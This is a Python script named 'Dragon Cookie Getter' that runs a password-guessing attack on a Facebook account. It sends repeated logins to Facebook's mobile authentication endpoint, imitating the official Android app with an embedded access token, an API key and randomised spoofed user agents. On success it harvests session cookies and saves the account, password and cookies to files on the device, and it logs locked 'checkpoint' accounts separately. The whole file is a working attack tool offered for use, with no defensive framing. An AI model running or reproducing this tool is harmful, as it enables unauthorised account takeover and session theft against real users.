import requests
import uuid
import base64
import os
import sys
import random
import json

# Colors
R = '\033[1;91m'  # Red
S = '\033[1;92m'  # Green
A = '\033[1;93m'  # Yellow
W = '\033[1;97m'  # White

# Global counters
oks = []
cps = []
loop = 0

def randBuildvsskj():
    ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_31"])
    END = "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/'+'{density=3.0,width=1080,height=1776}'+';FBLC/en_'+'US;'+'FBCR/Vi'+'deo'+'tr'+'on;FBMF/m'+'otor'+'ola;FBBD/mo'+'tor'+'ola;FBPN/com.facebook.katana;FBDV/X'+'T156'+'3;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]"
    ua = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/120.0.2210.150 Version/17.0 Mobile/15E148 Safari/604.1","Mozilla/5.0 (iPod; U; CPU iPhone OS 4_1 like Mac OS X; vi-VN) AppleWebKit/535.47.5 (KHTML, like Gecko) Version/3.0.5 Mobile/8B117 Safari/6535.47.5","Mozilla/5.0 (iPad; CPU OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/605.1.15","Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/119.0.2151.78 Version/17.0 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Linux; Android 13; motorola edge 30 neo Build/T1SSM33.1-121-4) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 GNews Android/2022140634","Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A035G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]"])+END
    return ua

class CookieGetter:
    def __init__(self, id_list):
        self.id = id_list
    
    def methodA(self, sid, psw):
        try:
            global oks, cps, loop
            
            # Progress display
            sys.stdout.write(f"\r {S}[Dragon] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            
            # Try each password
            for ps in psw:
                print(f"\n{A}[*] Trying password: {ps}{W}")
                
                with requests.Session() as session:
                    # Request data
                    data = {
                        "adid": str(uuid.uuid4()),
                        "format": "json",
                        "device_id": str(uuid.uuid4()),
                        "cpl": "true",
                        "family_device_id": str(uuid.uuid4()),
                        "credentials_type": "device_based_login_password",
                        "error_detail_type": "button_with_disabled",
                        "source": "device_based_login",
                        "email": sid,
                        "password": ps,
                        "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                        "generate_session_cookies": "1",
                        "meta_inf_fbmeta": "",
                        "advertiser_id": str(uuid.uuid4()),
                        "currently_logged_in_userid": "0",
                        "locale": "en_GB",
                        "client_country_code": "GB",
                        "method": "auth.login",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        "api_key": "882a8490361da98702bf97a021ddc14d"
                    }
                    
                    # Request headers with your custom UA
                    headers = {
                        'User-Agent': randBuildvsskj(),
                        'authority': 'x.facebook.com',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'accept-language': 'en-US,en;q=0.9',
                        'cache-control': 'max-age=0',
                        'dpr': '2',
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                        'sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
                        'sec-ch-ua-mobile': '?1',
                        'sec-ch-ua-model': '"Infinix X6726B"',
                        'sec-ch-ua-platform': '"Android"',
                        'sec-ch-ua-platform-version': '"15.0.0"',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'same-origin',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'user-agent': randBuildvsskj(),
                        'viewport-width': '980',
                    }
                    
                    # Make request
                    try:
                        print(f"{A}[*] Sending request...{W}")
                        response = session.post(
                            "https://b-graph.facebook.com/auth/login",
                            data=data,
                            headers=headers,
                            allow_redirects=False,
                            timeout=20
                        )
                        
                        print(f"{A}[*] Response Status: {response.status_code}{W}")
                        
                        # Try to parse JSON
                        try:
                            q = response.json()
                            print(f"{A}[*] Response Keys: {list(q.keys())}{W}")
                            
                            # Debug: print full response for first attempt
                            if loop == 0:
                                print(f"{A}[DEBUG] Full Response:{W}")
                                print(json.dumps(q, indent=2)[:500])
                            
                        except json.JSONDecodeError:
                            print(f"{R}[!] Failed to parse JSON{W}")
                            print(response.text[:500])
                            continue
                        
                        # Check response
                        if 'session_key' in q:
                            # Success - extract cookies
                            ckkk = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
                            Dragonb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/", "-")
                            cookie = f"sb={Dragonb};{ckkk}"
                            
                            print(f"\n{R} [Dragon-OK] {sid} | {ps} {S}\n")
                            oks.append(sid)
                            
                            # Save results
                            with open('/sdcard/Dragon_OK_M1.txt', 'a') as f:
                                f.write(f'{sid}|{ps}\n')
                            with open('/sdcard/Dragon-COOKIE-ID-M1.txt', 'a') as f:
                                f.write(f'{sid}|{ps}|{cookie}\n')
                            break
                            
                        elif 'error' in q:
                            error_msg = q.get('error', {}).get('message', '')
                            print(f"{R}[!] Error: {error_msg}{W}")
                            
                            if 'www.facebook.com' in str(error_msg):
                                # Checkpoint
                                print(f"{A}[Dragon-CP] {sid} | {ps}{W}")
                                cps.append(sid)
                                with open('/sdcard/Dragon_CP.txt', 'a') as f:
                                    f.write(f'{sid}|{ps}\n')
                                break
                        else:
                            print(f"{A}[!] Unknown response{W}")
                            continue
                            
                    except requests.exceptions.Timeout:
                        print(f"{R}[!] Timeout - Retrying...{W}")
                        continue
                    except requests.exceptions.ConnectionError as e:
                        print(f"{R}[!] Connection Error: {str(e)}{W}")
                        continue
                    except Exception as e:
                        print(f"{R}[!] Error: {str(e)}{W}")
                        continue
            
            loop += 1
            
        except Exception as e:
            print(f"{R}[!] Fatal Error: {str(e)}{W}")
            loop += 1

# Main execution
if __name__ == "__main__":
    print(f"{S}╔═══════════════════════════════════════╗{W}")
    print(f"{S}║     DRAGON COOKIE GETTER SCRIPT      ║{W}")
    print(f"{S}╚═══════════════════════════════════════╝{W}\n")
    
    # Get email input
    email = input(f"{W}[{S}+{W}] Enter your email/phone: {S}").strip()
    
    # Get passwords
    print(f"\n{W}[{S}+{W}] Enter passwords (one per line, press Enter twice when done):{S}\n")
    passwords = []
    
    while True:
        pw = input(f"{W}Password {len(passwords)+1}: {S}").strip()
        if pw == "":
            if len(passwords) > 0:
                break
            else:
                print(f"{R}Please enter at least one password!{W}")
                continue
        passwords.append(pw)
    
    # Confirm
    print(f"\n{W}═══════════════════════════════════════")
    print(f"{W}Email/Phone: {S}{email}{W}")
    print(f"{W}Passwords: {S}{len(passwords)} passwords loaded{W}")
    print(f"{W}═══════════════════════════════════════\n")
    
    confirm = input(f"{W}[{A}?{W}] Start cracking? (y/n): {S}").strip().lower()
    
    if confirm == 'y':
        print(f"\n{S}[Dragon] Starting cookie getter...{W}\n")
        
        # Create instance and run
        id_list = [email]
        getter = CookieGetter(id_list)
        getter.methodA(email, passwords)
        
        # Final results
        print(f"\n\n{W}═══════════════════════════════════════")
        print(f"{S}[Dragon] Process Complete!{W}")
        print(f"{W}OK: {S}{len(oks)}{W}")
        print(f"{W}CP: {A}{len(cps)}{W}")
        print(f"{W}═══════════════════════════════════════\n")
        
        if len(oks) > 0:
            print(f"{S}Results saved to:{W}")
            print(f"  - /sdcard/Dragon_OK_M1.txt")
            print(f"  - /sdcard/Dragon-COOKIE-ID-M1.txt\n")
    else:
        print(f"\n{R}[Dragon] Cancelled by user.{W}\n")
